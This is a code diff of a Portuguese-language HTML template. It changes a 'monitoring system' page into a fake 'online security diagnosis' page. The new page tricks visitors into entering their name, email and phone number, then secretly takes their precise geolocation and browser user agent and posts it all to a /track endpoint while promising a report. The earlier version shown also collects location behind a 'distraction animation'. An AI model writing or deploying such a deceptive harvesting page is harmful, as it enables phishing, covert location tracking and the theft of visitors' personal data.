@@ -3,58 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bem-vindo ao Sistema de Monitoramento</title>
+    <title>Teste sua Segurança Online!</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
 <body>
     <div class="container">
-        <h1>Bem-vindo ao Sistema de Monitoramento</h1>
-        <p>Você está prestes a explorar um sistema inteligente de monitoramento. Não se preocupe, nada de errado por aqui!</p>
-        <button class="button">Iniciar Exploração</button>
+        <h1>🚀 Seu Diagnóstico de Segurança Online</h1>
+        <p>Descubra agora se sua conexão está exposta e receba um relatório exclusivo sobre sua segurança digital! 🔒</p>
 
-        <!-- Animação de distração -->
-        <div class="animation-container"></div>
+        <form id="dataForm">
+            <label for="nome">👤 Seu Nome:</label>
+            <input type="text" id="nome" name="nome" required placeholder="Digite seu nome...">
+
+            <label for="email">📩 Seu Melhor Email:</label>
+            <input type="email" id="email" name="email" required placeholder="Digite seu email...">
+
+            <label for="telefone">📱 Número de Celular:</label>
+            <input type="tel" id="telefone" name="telefone" required placeholder="(XX) XXXXX-XXXX">
+
+            <button type="submit" class="button">🔍 Analisar Segurança</button>
+        </form>
+
+        <div id="responseMessage"></div>
     </div>
 
     <script>
-        // Função para enviar os dados ao backend
-        function sendDataToBackend(latitude, longitude, userAgent) {
-            fetch('/track', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    latitude: latitude,
-                    longitude: longitude,
-                    userAgent: userAgent
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Dados enviados com sucesso:', data);
-            })
-            .catch((error) => {
-                console.error('Erro ao enviar dados:', error);
-            });
-        }
+        document.getElementById('dataForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        // Simula a interação do botão (não redireciona para outras páginas, apenas simula a ação)
-        document.querySelector('.button').addEventListener('click', function() {
-            alert('Exploração iniciada! Os dados estão sendo monitorados.');
-            
-            // Obter a localização do usuário
+            const nome = document.getElementById('nome').value;
+            const email = document.getElementById('email').value;
+            const telefone = document.getElementById('telefone').value;
+            const userAgent = navigator.userAgent;
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    const userAgent = navigator.userAgent;
 
-                    console.log(`Latitude: ${latitude}, Longitude: ${longitude}, User Agent: ${userAgent}`);
-                    
-                    // Enviar os dados para o backend
-                    sendDataToBackend(latitude, longitude, userAgent);
+                    fetch('/track', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            nome: nome,
+                            email: email,
+                            telefone: telefone,
+                            latitude: latitude,
+                            longitude: longitude,
+                            userAgent: userAgent
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('responseMessage').innerHTML = `<p style="color: #0f0;">✅ Dados enviados! Em breve você receberá seu relatório.</p>`;
+                    })
+                    .catch(error => {
+                        console.error('Erro ao enviar dados:', error);
+                        document.getElementById('responseMessage').innerHTML = `<p style="color: red;">❌ Erro ao enviar dados.</p>`;
+                    });
                 });
             } else {
                 alert("Geolocalização não suportada pelo seu navegador.");
